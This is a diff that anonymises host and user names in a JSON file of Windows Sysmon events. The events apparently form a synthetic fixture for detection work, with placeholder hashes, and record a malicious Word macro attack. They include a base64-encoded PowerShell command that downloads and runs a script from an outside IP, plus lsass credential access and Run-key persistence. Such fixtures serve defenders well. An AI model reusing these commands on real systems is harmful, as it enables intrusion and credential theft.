@@ -1,19 +1,19 @@
 [
   {
-    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:10.000Z", "Computer": "MERIDIAN-WS01", "Channel": "Microsoft-Windows-Sysmon/Operational"},
+    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:10.000Z", "Computer": "WIN10-01", "Channel": "Microsoft-Windows-Sysmon/Operational"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:10.000",
       "ProcessId": "3800", "ProcessGuid": "{aaa00001}",
       "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-      "CommandLine": "WINWORD.EXE /n \"C:\\Users\\jsmith\\Downloads\\invoice_nov2024.docm\"",
+      "CommandLine": "WINWORD.EXE /n \"C:\\Users\\user01\\Downloads\\invoice_nov2024.docm\"",
       "ParentProcessId": "2500", "ParentProcessGuid": "{aaa00000}",
       "ParentImage": "C:\\Windows\\explorer.exe",
-      "User": "MERIDIAN\\jsmith", "IntegrityLevel": "Medium",
+      "User": "WIN10-01\\user01", "IntegrityLevel": "Medium",
       "Hashes": "SHA256=1a2b3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890"
     }
   },
   {
-    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:35.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:35.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:35.000",
       "ProcessId": "4200", "ProcessGuid": "{aaa00002}",
@@ -21,12 +21,12 @@
       "CommandLine": "cmd.exe /c powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
       "ParentProcessId": "3800", "ParentProcessGuid": "{aaa00001}",
       "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-      "User": "MERIDIAN\\jsmith", "IntegrityLevel": "Medium",
+      "User": "WIN10-01\\user01", "IntegrityLevel": "Medium",
       "Hashes": "SHA256=2b3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890ab"
     }
   },
   {
-    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:35.200Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:35.200Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:35.200",
       "ProcessId": "4400", "ProcessGuid": "{aaa00003}",
@@ -34,12 +34,12 @@
       "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
       "ParentProcessId": "4200", "ParentProcessGuid": "{aaa00002}",
       "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-      "User": "MERIDIAN\\jsmith", "IntegrityLevel": "Medium",
+      "User": "WIN10-01\\user01", "IntegrityLevel": "Medium",
       "Hashes": "SHA256=3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890abcd"
     }
   },
   {
-    "System": {"EventID": 3, "TimeCreated": "2024-11-15T07:44:38.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 3, "TimeCreated": "2024-11-15T07:44:38.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:38.000",
       "ProcessId": "4400", "ProcessGuid": "{aaa00003}",
@@ -47,11 +47,11 @@
       "SourceIp": "10.0.1.55", "SourcePort": "49200",
       "DestinationIp": "185.220.101.47", "DestinationPort": "443",
       "Protocol": "tcp", "Initiated": "true",
-      "User": "MERIDIAN\\jsmith"
+      "User": "WIN10-01\\user01"
     }
   },
   {
-    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:45.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 1, "TimeCreated": "2024-11-15T07:44:45.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:45.000",
       "ProcessId": "4800", "ProcessGuid": "{aaa00004}",
@@ -59,23 +59,23 @@
       "CommandLine": "rundll32.exe C:\\ProgramData\\update.dll,DllMain",
       "ParentProcessId": "4400", "ParentProcessGuid": "{aaa00003}",
       "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-      "User": "MERIDIAN\\jsmith", "IntegrityLevel": "Medium",
+      "User": "WIN10-01\\user01", "IntegrityLevel": "Medium",
       "Hashes": "SHA256=4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
     }
   },
   {
-    "System": {"EventID": 11, "TimeCreated": "2024-11-15T07:44:46.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 11, "TimeCreated": "2024-11-15T07:44:46.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:44:46.000",
       "ProcessId": "4400", "ProcessGuid": "{aaa00003}",
       "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       "TargetFilename": "C:\\ProgramData\\update.dll",
       "CreationUtcTime": "2024-11-15 07:44:46.000",
-      "User": "MERIDIAN\\jsmith"
+      "User": "WIN10-01\\user01"
     }
   },
   {
-    "System": {"EventID": 10, "TimeCreated": "2024-11-15T07:45:02.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 10, "TimeCreated": "2024-11-15T07:45:02.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:45:02.000",
       "SourceProcessId": "4800", "SourceProcessGuid": "{aaa00004}",
@@ -84,11 +84,11 @@
       "TargetImage": "C:\\Windows\\System32\\lsass.exe",
       "GrantedAccess": "0x1410",
       "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll|C:\\Windows\\System32\\KERNELBASE.dll",
-      "User": "MERIDIAN\\jsmith"
+      "User": "WIN10-01\\user01"
     }
   },
   {
-    "System": {"EventID": 13, "TimeCreated": "2024-11-15T07:45:10.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 13, "TimeCreated": "2024-11-15T07:45:10.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:45:10.000",
       "ProcessId": "4800", "ProcessGuid": "{aaa00004}",
@@ -96,11 +96,11 @@
       "EventType": "SetValue",
       "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc",
       "Details": "C:\\ProgramData\\update.dll",
-      "User": "MERIDIAN\\jsmith"
+      "User": "WIN10-01\\user01"
     }
   },
   {
-    "System": {"EventID": 3, "TimeCreated": "2024-11-15T07:45:15.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 3, "TimeCreated": "2024-11-15T07:45:15.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 07:45:15.000",
       "ProcessId": "4800", "ProcessGuid": "{aaa00004}",
@@ -108,11 +108,11 @@
       "SourceIp": "10.0.1.55", "SourcePort": "49210",
       "DestinationIp": "185.220.101.47", "DestinationPort": "443",
       "Protocol": "tcp", "Initiated": "true",
-      "User": "MERIDIAN\\jsmith"
+      "User": "WIN10-01\\user01"
     }
   },
   {
-    "System": {"EventID": 1, "TimeCreated": "2024-11-15T08:01:00.000Z", "Computer": "MERIDIAN-WS01"},
+    "System": {"EventID": 1, "TimeCreated": "2024-11-15T08:01:00.000Z", "Computer": "WIN10-01"},
     "EventData": {
       "UtcTime": "2024-11-15 08:01:00.000",
       "ProcessId": "5200", "ProcessGuid": "{aaa00010}",
